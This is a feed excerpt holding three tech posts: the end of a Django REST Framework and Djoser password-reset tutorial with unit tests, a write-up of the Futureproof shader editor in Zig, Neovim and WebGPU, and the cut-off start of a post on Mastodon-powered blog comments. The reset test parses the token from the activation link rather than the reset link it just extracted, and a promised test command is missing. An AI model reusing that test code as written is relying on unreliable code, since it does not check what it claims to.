  <li><a href="https://djoser.readthedocs.io/en/latest/base_endpoints.html#reset-password-confirmation">Reset Password Confirmation</a> endpoint, that is available at <code>/users/reset_password_confirm/</code>. We need to send in <code>POST</code> request the <code>uid</code> and <code>token</code> from reset link to this endpoint. We also need to send a new password provided by user. If all goes well, this endpoint will return <code>HTTP_204_NO_CONTENT</code>.</li>
</ul>

<p>The reset password functionality flow is presented below:</p>

<p><img src="https://saasitive.com/tutorial/django-rest-framework-reset-password/reset_password_flow.png" alt="Reset Password Flow"></p>

<p>To enable reset password functionality we need to configure <code>Djoser</code> in <code>backend/server/server/settings.py</code> file. We need to set <code>PASSWORD_RESET_CONFIRM_URL</code> variable that points to the URL address in the frontend with reset password confirm view.</p>

<div><div><pre><code><span># backend/server/server/settings.py
</span>
<span># ...
# configure Djoser
</span><span>DJOSER</span> <span>=</span> <span>{</span>
    <span>"USER_ID_FIELD"</span><span>:</span> <span>"username"</span><span>,</span>
    <span>"LOGIN_FIELD"</span><span>:</span> <span>"email"</span><span>,</span>
    <span>"SEND_ACTIVATION_EMAIL"</span><span>:</span> <span>True</span><span>,</span>
    <span>"ACTIVATION_URL"</span><span>:</span> <span>"activate/{uid}/{token}"</span><span>,</span>
    <span>"PASSWORD_RESET_CONFIRM_URL"</span><span>:</span> <span>"reset_password/{uid}/{token}"</span><span>,</span> <span># the reset link 
</span>    <span>'SERIALIZERS'</span><span>:</span> <span>{</span>
        <span>'token_create'</span><span>:</span> <span>'apps.accounts.serializers.CustomTokenCreateSerializer'</span><span>,</span>
    <span>},</span>
<span>}</span>
<span># ...
</span></code></pre></div></div>

<p>The example of reset password email:</p>

<div><div><pre><code><span>Subject</span><span>:</span><span> Password reset on SaaSitive</span>

Body:

You're receiving this email because you requested a password reset for your user account at SaaSitive.

Please go to the following page and choose a new password:
http://testserver/reset_password/MQ/afnd93-8d1799decda7137bbf57c047ed33ee86
Your username, in case you've forgotten: test_user

Thanks for using our site!

The SaaSitive team
</code></pre></div></div>

<p>The link to reset the password:</p>

<div><div><pre><code>http://testserver/reset_password/MQ/afnd93-8d1799decda7137bbf57c047ed33ee86
</code></pre></div></div>

<p>From our reset link:</p>
<ul>
  <li><code>uid = MQ</code>,</li>
  <li><code>token = afnd93-8d1799decda7137bbf57c047ed33ee86</code>.</li>
</ul>

<p>Don’t worry that the reset link has <code>http://testserver</code> - it is only for testing purposes. It will be set to the correct domain address in production.</p>

<h2 id="test-reset-password-functionality">Test reset password functionality</h2>

<p>We are ready to write tests for reset password functionality. We will write three tests:</p>
<ul>
  <li>test for normal flow, the registered user with active account request the password reset,</li>
  <li>test for reset password of inactive user (email not verified),</li>
  <li>test for reset password with not existing email address.</li>
</ul>

<p>Let’s add tests in <code>backend/server/apps/accounts/tests.py</code> file. Please add a new class <code>PasswordResetTest</code> (above the <code>EmailVerificationTest</code> class from the <a href="https://saasitive.com/tutorial/django-rest-framework-email-verification">previous post</a>).</p>

<div><div><pre><code><span># backend/server/apps/accounts/tests.py 
# ...
</span>
<span>class</span> <span>PasswordResetTest</span><span>(</span><span>APITestCase</span><span>):</span>

    <span># endpoints needed
</span>    <span>register_url</span> <span>=</span> <span>"/api/v1/users/"</span>
    <span>activate_url</span> <span>=</span> <span>"/api/v1/users/activation/"</span>
    <span>login_url</span> <span>=</span> <span>"/api/v1/token/login/"</span>
    <span>send_reset_password_email_url</span> <span>=</span> <span>"/api/v1/users/reset_password/"</span>
    <span>confirm_reset_password_url</span> <span>=</span> <span>"/api/v1/users/reset_password_confirm/"</span>
    
    <span># user infofmation
</span>    <span>user_data</span> <span>=</span> <span>{</span>
        <span>"email"</span><span>:</span> <span>"test@example.com"</span><span>,</span> 
        <span>"username"</span><span>:</span> <span>"test_user"</span><span>,</span> 
        <span>"password"</span><span>:</span> <span>"verysecret"</span>
    <span>}</span>
    <span>login_data</span> <span>=</span> <span>{</span>
        <span>"email"</span><span>:</span> <span>"test@example.com"</span><span>,</span> 
        <span>"password"</span><span>:</span> <span>"verysecret"</span>
    <span>}</span>

    <span>def</span> <span>test_reset_password</span><span>(</span><span>self</span><span>):</span>
        <span># register the new user
</span>        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>register_url</span><span>,</span> <span>self</span><span>.</span><span>user_data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span># expected response 
</span>        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_201_CREATED</span><span>)</span>
        <span># expected one email to be send
</span>        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>len</span><span>(</span><span>mail</span><span>.</span><span>outbox</span><span>),</span> <span>1</span><span>)</span>
        
        <span># parse email to get uid and token
</span>        <span>email_lines</span> <span>=</span> <span>mail</span><span>.</span><span>outbox</span><span>[</span><span>0</span><span>].</span><span>body</span><span>.</span><span>splitlines</span><span>()</span>
        <span>activation_link</span> <span>=</span> <span>[</span><span>l</span> <span>for</span> <span>l</span> <span>in</span> <span>email_lines</span> <span>if</span> <span>"/activate/"</span> <span>in</span> <span>l</span><span>][</span><span>0</span><span>]</span>
        <span>uid</span><span>,</span> <span>token</span> <span>=</span> <span>activation_link</span><span>.</span><span>split</span><span>(</span><span>"/"</span><span>)[</span><span>-</span><span>2</span><span>:]</span>
        
        <span># verify email
</span>        <span>data</span> <span>=</span> <span>{</span><span>"uid"</span><span>:</span> <span>uid</span><span>,</span> <span>"token"</span><span>:</span> <span>token</span><span>}</span>
        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>activate_url</span><span>,</span> <span>data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_204_NO_CONTENT</span><span>)</span>

        <span># reset password
</span>        <span>data</span> <span>=</span> <span>{</span><span>"email"</span><span>:</span> <span>self</span><span>.</span><span>user_data</span><span>[</span><span>"email"</span><span>]}</span>
        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>send_reset_password_email_url</span><span>,</span> <span>data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_204_NO_CONTENT</span><span>)</span>

        <span># parse reset-password email to get uid and token
</span>        <span># it is a second email!
</span>        <span>email_lines</span> <span>=</span> <span>mail</span><span>.</span><span>outbox</span><span>[</span><span>1</span><span>].</span><span>body</span><span>.</span><span>splitlines</span><span>()</span>
        <span>reset_link</span> <span>=</span> <span>[</span><span>l</span> <span>for</span> <span>l</span> <span>in</span> <span>email_lines</span> <span>if</span> <span>"/reset_password/"</span> <span>in</span> <span>l</span><span>][</span><span>0</span><span>]</span>
        <span>uid</span><span>,</span> <span>token</span> <span>=</span> <span>activation_link</span><span>.</span><span>split</span><span>(</span><span>"/"</span><span>)[</span><span>-</span><span>2</span><span>:]</span>

        <span># confirm reset password
</span>        <span>data</span> <span>=</span> <span>{</span><span>"uid"</span><span>:</span> <span>uid</span><span>,</span> <span>"token"</span><span>:</span> <span>token</span><span>,</span> <span>"new_password"</span><span>:</span> <span>"new_verysecret"</span><span>}</span>
        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>confirm_reset_password_url</span><span>,</span> <span>data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_204_NO_CONTENT</span><span>)</span>

        <span># login to get the authentication token with old password
</span>        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>login_url</span><span>,</span> <span>self</span><span>.</span><span>login_data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_400_BAD_REQUEST</span><span>)</span>
        
        <span># login to get the authentication token with new password
</span>        <span>login_data</span> <span>=</span> <span>dict</span><span>(</span><span>self</span><span>.</span><span>login_data</span><span>)</span>
        <span>login_data</span><span>[</span><span>"password"</span><span>]</span> <span>=</span> <span>"new_verysecret"</span>
        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>login_url</span><span>,</span> <span>login_data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_200_OK</span><span>)</span>
        
<span># ...
</span></code></pre></div></div>

<p>Steps in the <code>test_reset_password</code>:</p>
<ul>
  <li>register a new user,</li>
  <li>parse activation email,</li>
  <li>activate the user,</li>
  <li>request email with reset password link,</li>
  <li>parse reset password email,</li>
  <li>confirm reset password with <code>uid</code>, <code>token</code> and <code>new_password</code>,</li>
  <li>try to login with old password (fails with <code>HTTP_400_BAD_REQUEST</code>),</li>
  <li>try to login with new password (success with <code>HTTP_200_OK</code>).</li>
</ul>

<p>Test the functionality for inactive user (without verified email):</p>

<div><div><pre><code><span># backend/server/apps/accounts/tests.py 
# ...
</span>
    <span>def</span> <span>test_reset_password_inactive_user</span><span>(</span><span>self</span><span>):</span>
        <span># register the new user
</span>        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>register_url</span><span>,</span> <span>self</span><span>.</span><span>user_data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_201_CREATED</span><span>)</span>

        <span># reset password for inactive user
</span>        <span>data</span> <span>=</span> <span>{</span><span>"email"</span><span>:</span> <span>self</span><span>.</span><span>user_data</span><span>[</span><span>"email"</span><span>]}</span>
        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>send_reset_password_email_url</span><span>,</span> <span>data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_204_NO_CONTENT</span><span>)</span>
        <span># the email wasnt send
</span>        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>len</span><span>(</span><span>mail</span><span>.</span><span>outbox</span><span>),</span> <span>1</span><span>)</span>        
<span># ...
</span>
</code></pre></div></div>

<p>Please notice that there is <code>HTTP_204_NO_CONTENT</code> response but no email is sent. There is only one email in <code>mail.outbox</code> and it is activation email from registration step.</p>

<p>Test the functionality for a wrong email:</p>

<div><div><pre><code><span># backend/server/apps/accounts/tests.py 
# ...
</span>
    <span>def</span> <span>test_reset_password_wrong_email</span><span>(</span><span>self</span><span>):</span>
        <span>data</span> <span>=</span> <span>{</span><span>"email"</span><span>:</span> <span>"wrong@email.com"</span><span>}</span>
        <span>response</span> <span>=</span> <span>self</span><span>.</span><span>client</span><span>.</span><span>post</span><span>(</span><span>self</span><span>.</span><span>send_reset_password_email_url</span><span>,</span> <span>data</span><span>,</span> <span>format</span><span>=</span><span>"json"</span><span>)</span>
        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>response</span><span>.</span><span>status_code</span><span>,</span> <span>status</span><span>.</span><span>HTTP_204_NO_CONTENT</span><span>)</span>
        <span># the email wasnt send
</span>        <span>self</span><span>.</span><span>assertEqual</span><span>(</span><span>len</span><span>(</span><span>mail</span><span>.</span><span>outbox</span><span>),</span> <span>0</span><span>)</span>

<span># ...
</span>
</code></pre></div></div>

<p>Similar like above the <code>HTTP_204_NO_CONTENT</code> is returned and no email is sent. To run our tests please use the following command:</p>



<p>The expected output:</p>

<div><div><pre><code>Creating test database for alias 'default'...
System check identified no issues (0 silenced).
.......
----------------------------------------------------------------------
Ran 7 tests in 1.765s

OK
Destroying test database for alias 'default'...
</code></pre></div></div>

<p>We have 3 tests for reset password and 4 tests for email verification functionality.</p>

<p><img src="https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif" alt=""></p>

<h2 id="commit-changes-to-the-repository">Commit changes to the repository</h2>

<p>That’s all. We have reset password functionality ready and tested. We need to commit changes to the repository:</p>

<div><div><pre><code>git commit <span>-am</span> <span>"reset password in the backend"</span>
git push
</code></pre></div></div>

<h2 id="summary">Summary</h2>

<ul>
  <li>We configured <code>Djoser</code> for reset password functionality (by setting one variable!).</li>
  <li>We have two endpoints: <strong>reset password</strong> for sending email with reset link and <strong>reset password confirm</strong> to set a new password.</li>
  <li>New functionality was tested with unit tests.</li>
  <li>We will write user interface in React for this functionality in the next post.</li>
</ul>

<p>The code for this tutorial is available at <a href="https://github.com/saasitive/django-react-boilerplate">Github repository</a>.</p>


		<hr>

		<h4>Let's stay in touch!</h4>
		<p>
			Would you like to be notified about new posts? Please fill this
			<a href="https://forms.gle/rgAG9gkhUEH2wUVt5" target="_blank">form</a>.
		</p>
		<p>
			Have you found a bug in the code? Please add a <a href="https://github.com/saasitive/django-react-boilerplate/issues/new" target="_blank">GitHub
				issue</a>.
		</p>
		<p>
			Do you have problems with running the code or setup and need help? Please add a <a href="https://stackoverflow.com/">StackOverflow</a> question with <b>django-react</b> tag.
		</p>

		<hr>

		
		

<hr>
		



		

	</div></div>]]>
            </description>
            <link>https://saasitive.com/tutorial/django-rest-framework-reset-password/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570724</guid>
            <pubDate>Tue, 29 Dec 2020 15:37:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Futureproof: A shader editor in Zig, WebGPU, and Neovim]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25570616">thread link</a>) | @mkeeter
<br/>
December 29, 2020 | https://mattkeeter.com/projects/futureproof | <a href="https://web.archive.org/web/*/https://mattkeeter.com/projects/futureproof">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<!-- End header -->
<p><a href="https://github.com/mkeeter/futureproof"><em>Futureproof</em></a> is a live editor for GPU shaders,
built on Zig, Neovim, and WebGPU.</p>
<p><img src="https://mattkeeter.com/projects/marble.png" alt="Marble shader"><br>
<a href="https://www.shadertoy.com/view/MtX3Ws">(original shader by S. Guillitte)</a></p>
<p>It's designed for a quick feedback loop,
recompiling shaders and marking errors live!</p>
<p>The name is tongue-in-cheek,
because it builds on as many unproven new technologies as possible:</p>
<ul>
<li>It is written in <a href="https://ziglang.org/">Zig</a>, which is a "better C"</li>
<li>The editor is an embedded <a href="https://neovim.io/">Neovim</a>, which is a modernized Vim</li>
<li>Graphics are done with <a href="https://gpuweb.github.io/gpuweb/">WebGPU</a>,
which is an in-development next-gen API</li>
</ul>
<p>The system also uses
<a href="https://www.freetype.org/">FreeType</a> for font rasterization
and <a href="https://www.glfw.org/">GLFW</a> for windowing,
but those are both relatively mature,
so I don't get any points for them.</p>
<h2>Embedding Neovim</h2>
<p>Neovim is run as a subprocess (<code>nvim --embed</code>),
which communicates on <code>stdin</code> and <code>stdout</code>
using the <a href="https://github.com/msgpack-rpc/msgpack-rpc"><code>msgpack-rpc</code></a> format.</p>
<p>I wrote <a href="https://github.com/mkeeter/futureproof/blob/master/src/msgpack.zig"><code>msgpack</code></a>
and <a href="https://github.com/mkeeter/futureproof/blob/master/src/rpc.zig"><code>msgpack-rpc</code></a>
libraries in Zig from the ground up,
which ended up being &lt; 1 KLOC.</p>
<p>A listener thread monitors the subprocess's <code>stdout</code>,
decoding messages then passing events and responses into a pair of queues.
The main loop claims and handles events before drawing each frame.</p>
<p>RPC calls are blocking: the call is encoded and passed to the subprocess's
<code>stdin</code>, then we wait for the listener thread to return the response
on the queue.</p>
<p><img src="https://mattkeeter.com/projects/nvim.svg" alt="Neovim"></p>
<h2>Drawing the character grid</h2>
<p>Neovim's abstract UI model is a monospaced grid of a particular width and height.
Each cell in the grid has a character and attribute ID;
the latter is a lookup into a table of colors, bold, underlines, etc.</p>
<p>The grid and attribute table are modified through API messages
(<code>grid_line</code>, <code>grid_cursor_goto</code>, <code>hl_attr_define</code>, <code>mode_change</code>, etc),
so our UI has to keep track of this state.</p>
<p>These API calls are evaluated by the main loop
and edit state in CPU memory,
but we want rendering to be done by the GPU.
As it turns out,
both Zig and GLSL can import C headers, so Futureproof uses a fun trick:
we define a set of <a href="https://github.com/mkeeter/futureproof/blob/master/extern/futureproof.h">C <code>structs</code></a>,
populate them on the CPU (in Zig),
then copy them to the GPU and use them directly (in GLSL).</p>
<p>(This requires a <a href="https://github.com/KhronosGroup/GLSL/blob/master/extensions/ext/GL_EXT_scalar_block_layout.txt">GLSL extension</a>
to properly pack the <code>structs</code>)</p>
<p>We split the state into two pieces:</p>
<ul>
<li>Meta-data tables (attributes, font atlas, etc.) are in a <strong>uniform buffer</strong>,
as they're relatively small (11 KB in total)</li>
<li>The character grid is larger (1 MB), and so is passed as a <strong>storage buffer</strong></li>
</ul>
<p>The font is rasterized and packed into a texture on the CPU side.
As part of the meta-data, we include the positions and bounding boxes
of each character.
The font ends up looking something like this:</p>
<p><img src="https://mattkeeter.com/projects/font.png" alt="Font texture"></p>
<p>The grid stores character and attribute indices packed into a <code>uint32_t</code> per cell.
This limits us to 65535 characters, but that's acceptable.</p>
<p>In this architecture, the CPU side doesn't think about vertex positions at all!
It simply passes the character grid to a vertex shader and tells it to draw
<code>total_tiles * 6</code> elements.</p>
<p>The vertex shader then calculates vertex positions,
lays out tiles in the character grid,
samples from the font texture, and so on.</p>
<p>Getting pixel-perfect font rendering was a comedy of (off-by-one) errors,
including this particularly cursed GUI:</p>
<p><img src="https://mattkeeter.com/projects/haunted.png" alt="Haunted Neovim GUI"></p>
<h2>Platform integration</h2>
<p>I developed Futureproof on macOS,
and there were a few cases where I needed to hook into native APIs.</p>
<p>The <code>wgpu-native</code> demo simply <a href="https://github.com/gfx-rs/wgpu-native/blob/master/examples/triangle/main.c#L58-L66">writes Objective-C in <code>main.c</code></a>,
then <a href="https://github.com/gfx-rs/wgpu-native/blob/master/examples/triangle/CMakeLists.txt#L16">compiles with <code>-x objective-c</code></a>,
meaning the input source file is secretly Objective-C, rather than plain C.</p>
<p>This doesn't quite work with Zig, despite my best efforts:
the pass-through C compiler doesn't accept the <code>-x</code> flag.
Instead, we can use the <a href="https://developer.apple.com/documentation/objectivec/objective-c_runtime">Objective-C Runtime API</a> directly,
inspired by <a href="https://github.com/jimon/osx_app_in_plain_c">OS X app in Plain C</a>.</p>
<p>In practice, this is <a href="https://github.com/mkeeter/futureproof/blob/master/src/objc.zig">surprisingly clean</a>:
We're not defining our own classes, so we just use
<code>sel_getUid</code>, <code>objc_lookUpClass</code>, and <code>objc_msgSend</code>.
<a href="https://github.com/mkeeter/futureproof/blob/master/src/paste.zig#L9-L18">Here's how we use it</a>
to get a string from the pasteboard.</p>
<p>(Of course, this is fundamentally terrifying and shouldn't be used for production code)</p>
<h2>Live shader previews</h2>
<p>Futureproof attaches itself to the Neovim buffer,
so it receives messages whenever the buffer changes.
This lets us keep a mirror of the text on the Futureproof side of the RPC barrier.</p>
<p>If the text hasn't changed in some amount of time (200 ms by default),
we pass it to <code>shaderc</code> and attempt to compile it from GLSL to SPIR-V.
Errors are parsed out of the return value and passed back into Neovim,
showing up in the location list and as signs in the left column.</p>
<p><img src="https://mattkeeter.com/projects/error.png" alt="Error"></p>
<p>After a shader is successfully compiled, the SPIR-V bytecode is passed into WebGPU
and rendered with the rest of the GUI.</p>
<p>One unexpected challenge was keeping the GUI performant while
rendering a shader in the same GPU queue.
For challenging shaders like <a href="https://www.shadertoy.com/view/Ms2SD1">this seascape</a>,
the shader takes hundreds of milliseconds to render.</p>
<p><img src="https://mattkeeter.com/projects/seascape.png" alt="Seascape"></p>
<p>There's got to be a <em>good</em> way to handle this,
but for Futureproof, I used a hack:
when a shader takes too long,
the preview image is split into tiles, each of which updates once per GUI frame.
The tiles are stored in a separate texture,
which is copied into the main texture once all tiles have been rendered.</p>
<p>This effectively slows down the shader by a factor of <code>n^2</code>,
where <code>n</code> is the number of tiles per side.
We pick <code>n</code> to keep the GUI responsive,
with a median filter to stop single slow frames from messing things up.</p>
<p>I'd love to hear the <em>correct</em> way to handle this with WebGPU,
but suspect that it will require support for multiple queues,
which isn't yet in the standard.</p>
<h2>Are these technologies ready for use?</h2>
<h3>Neovim</h3>
<p>Yes, it's relatively stable.</p>
<p>I found <a href="https://github.com/neovim/neovim/issues/13418">one bug</a>
early in development,
which received no feedback, so that's a minor red flag.</p>
<p>More recently, I discovered a
<a href="https://github.com/neovim/neovim/issues/13626">more serious issue</a>
which makes it easy to deadlock Futureproof.
This more concerning,
but it may be a problem with how I architected the GUI and live error-marking system;
I'm waiting to hear back from the Neovim development team about this issue.</p>
<h3>Zig</h3>
<p>Absolutely not!
This is to be expected:
it's at 0.7.0, so it's not <em>supposed</em> to be stable or bug-free.</p>
<p>I discovered <a href="https://github.com/ziglang/zig/issues?q=is%3Aissue+author%3Amkeeter">multiple bugs</a>,
and understanding the standard library requires reading the source.</p>
<p>In addition, it's changing very quickly;
updating to the latest nightly build breaks Futureproof regularly.</p>
<p>Still, Zig is <strong>fun</strong>!</p>
<p>Things that I particularly like:</p>
<ul>
<li>The general-purpose allocator, which can print memory leaks on program exit.
This is like running in Valgrind all the time, and makes writing
leak-free code part of normal development.</li>
<li>C library interop is fantastic: you can natively import header files, then
call into C libraries, and it all just works!</li>
<li>The philosophy of passing explicit allocators around; particularly how arena
allocators can then be used for easy memory management.</li>
</ul>
<p>I want to like <code>comptime</code> evaluation,
but it's a little too shaky right now:
I tried to use it for a
<a href="https://github.com/mkeeter/futureproof/blob/master/src/msgpack.zig#L119-L183">generic <code>msgpack</code> struct packer</a>,
and often ended up confused whether my code was wrong or the compiler was broken.</p>
<p>More generally, I fear that <code>comptime</code> is <em>too powerful</em>:
without some kind of concept or trait system, it can be a free-for-all.
For example, using <a href="https://ziglang.org/documentation/master/#Generic-Data-Structures"><code>comptime</code> type variables to do generics</a>
is <em>extremely clever</em>,
but it means that generating documentation will be a challenge:
after all, it's powerful enough to return entirely different APIs
depending on the type!</p>
<p>(Of course, this is also true for C++ templates, but they're hard enough to use that
most people don't get too weird with them)</p>
<p>Similarly, error handling is a little rough:
there's no way to attach data (e.g. a message) to an error
while using the language-level error handling.</p>
<p>Finally, I'm a little iffy on the
"strings are simply arrays of <code>u8</code>" philosophy.
Though static strings are guaranteed to be UTF-8,
the onus is on the programmer
(rather than the type system)
to enforce that strings from other sources be correctly encoded.
For a detailed look at where this can break,
see the discussion of <code>std::fs::metadata</code> in
<a href="https://fasterthanli.me/articles/i-want-off-mr-golangs-wild-ride">this post</a></p>
<p>(the previous paragraph has been edited after publication,
based on feedback from the Zig Discord)</p>
<h3>WebGPU</h3>
<p>WebGPU is <em>fine</em>, but the documentation is lacking.
I had to reverse-engineer a lot of behavior from examples,
reading the source code,
and pre-existing knowledge of modern graphics APIs.
As discussed above,
the lack of multi-queue rendering was the only real frustration.</p>
<p>I was using the <a href="https://github.com/gfx-rs/wgpu-native"><code>wgpu-native</code></a> bindings,
which seem a bit unloved compared to <a href="https://github.com/gfx-rs/wgpu-rs"><code>wgpu-rs</code></a>.
There's <a href="https://github.com/gfx-rs/wgpu-native/issues/53">one obvious bug</a>
which I encountered within 5 minutes,
and it's unclear how often it's synched with <code>wgpu-rs</code>'s releases.</p>
<p>It's frustrating needing <a href="https://github.com/google/shaderc"><code>shaderc</code></a>
to go from text to SPIR-V,
particularly because a full download unzips to 1.9GB (!!).
It looks like <a href="https://wgpu.rs/doc/naga/index.html"><code>naga</code></a>
aims to replace it, so I'm optimistic about the future!</p>
<h2>Future plans</h2>
<p>This was a fun exercise, but I'm not planning to develop it any further.</p>
<p>(It's likely that I'll build a similar system in Rust,
next time I want a framework for semi-interactive graphics programming)</p>
<p>The code is <a href="https://github.com/mkeeter/futureproof">on Github</a>,
and forks are welcome;
if one achieves critical momentum,
I'd be happy to link it here.</p>
<h2>Bonus Shader</h2>
<p>Here's a very bad Cornell Box Raytracer that I threw together,
basically so I could have a project thumbnail:</p>
<p><img src="https://mattkeeter.com/projects/cornell.png" alt="Cornell box"></p>

<!-- Begin footer -->
</div></div>]]>
            </description>
            <link>https://mattkeeter.com/projects/futureproof</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570616</guid>
            <pubDate>Tue, 29 Dec 2020 15:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding comments to a static blog with Mastodon]]>
            </title>
            <description>
<![CDATA[
Score 263 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25570268">thread link</a>) | @ognarb
<br/>
December 29, 2020 | https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/ | <a href="https://web.archive.org/web/*/https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>

    
</header>


  <section>
    <p>One of the biggest disadvantages of static site generators is that
they are static and can’t include comments.</p>
<p>There are multiples solutions to solve this problem. You could add
a third party blog engine like Disqus, but this has the drawback
of including a third-party tool with a bad privacy record in your
website. Another solution would be to host an open-source alternative
but this comes at the cost of a higher maintenance burden. Having
to host a database was something we wanted to avoid with a
static site generator.</p>
<p>In my opinion, a better solution is to leverage the Mastodon and
Fediverse platform. Mastodon is a decentralized social network
and it allows people to communicate with each other without
being on the same server. It is inspired by Twitter, but instead
of tweeting, you write toot.</p>
<p>When publishing an article, you now only need to also write a
simple toot linking to your article. Then Mastodon has a simple
API to fetch the answer to your toot. This is the code I made for
my Hugo powered blog, but it is easily adaptable for other static
site generators. It will create a button to load comments instead
of loading them for every visitor so that it decreases the load on your
mastodon server.</p>
<div><pre><code data-lang="html">{{ with .Params.comments }}
<span>&lt;</span><span>div</span> <span>class</span><span>=</span><span>"article-content"</span><span>&gt;</span>
  <span>&lt;</span><span>h2</span><span>&gt;</span>Comments<span>&lt;/</span><span>h2</span><span>&gt;</span>
  <span>&lt;</span><span>p</span><span>&gt;</span>You can use your Mastodon account to reply to this <span>&lt;</span><span>a</span> <span>class</span><span>=</span><span>"link"</span> <span>href</span><span>=</span><span>"https://{{ .host }}/@{{ .username }}/{{ .id }}"</span><span>&gt;</span>post<span>&lt;/</span><span>a</span><span>&gt;</span>.<span>&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>p</span><span>&gt;&lt;</span><span>a</span> <span>class</span><span>=</span><span>"button"</span> <span>href</span><span>=</span><span>"https://{{ .host }}/interact/{{ .id }}?type=reply"</span><span>&gt;</span>Reply<span>&lt;/</span><span>a</span><span>&gt;&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>p</span> <span>id</span><span>=</span><span>"mastodon-comments-list"</span><span>&gt;&lt;</span><span>button</span> <span>id</span><span>=</span><span>"load-comment"</span><span>&gt;</span>Load comments<span>&lt;/</span><span>button</span><span>&gt;&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>noscript</span><span>&gt;&lt;</span><span>p</span><span>&gt;</span>You need JavaScript to view the comments.<span>&lt;/</span><span>p</span><span>&gt;&lt;/</span><span>noscript</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>src</span><span>=</span><span>"/assets/js/purify.min.js"</span><span>&gt;&lt;/</span><span>script</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>type</span><span>=</span><span>"text/javascript"</span><span>&gt;</span>
    <span>function</span> <span>escapeHtml</span><span>(</span><span>unsafe</span><span>)</span> <span>{</span>
      <span>return</span> <span>unsafe</span>
           <span>.</span><span>replace</span><span>(</span><span>/&amp;/g</span><span>,</span> <span>"&amp;amp;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/&lt;/g</span><span>,</span> <span>"&amp;lt;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/&gt;/g</span><span>,</span> <span>"&amp;gt;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/"/g</span><span>,</span> <span>"&amp;quot;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/'/g</span><span>,</span> <span>"&amp;#039;"</span><span>);</span>
   <span>}</span>

    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"load-comment"</span><span>).</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>function</span><span>()</span> <span>{</span>
      <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"load-comment"</span><span>).</span><span>innerHTML</span> <span>=</span> <span>"Loading"</span><span>;</span>
      <span>fetch</span><span>(</span><span>'https://{{ .host }}/api/v1/statuses/{{ .id }}/context'</span><span>)</span>
        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
          <span>return</span> <span>response</span><span>.</span><span>json</span><span>();</span>
        <span>})</span>
